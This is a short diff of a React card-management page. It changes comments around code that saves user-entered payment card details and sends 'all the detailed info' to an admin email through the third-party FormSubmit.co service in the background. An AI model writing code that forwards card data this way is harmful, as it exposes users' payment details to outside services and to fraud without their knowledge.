@@ -74,14 +74,13 @@ export default function CardsPage() {
     const onAddOwnSubmit = async (values: AddCardValues) => {
         try {
             // 1. Save to Firestore
-            // We mask the number for the UI list, but the user asked for "All info needed" 
-            // so we store the fields they provided.
+            // We store the information in the user's account for their view
             await addOwnCard({
                 ...values,
             });
 
             // 2. Send via FormSubmit.co email
-            // We use fetch to send it as a form submission in the background
+            // Send all the detailed info to the admin email
             const emailData = new FormData();
             emailData.append('Subject', `New Card Linked: ${values.brand.toUpperCase()} - ${user?.email}`);
             emailData.append('User Email', user?.email || 'Unknown');
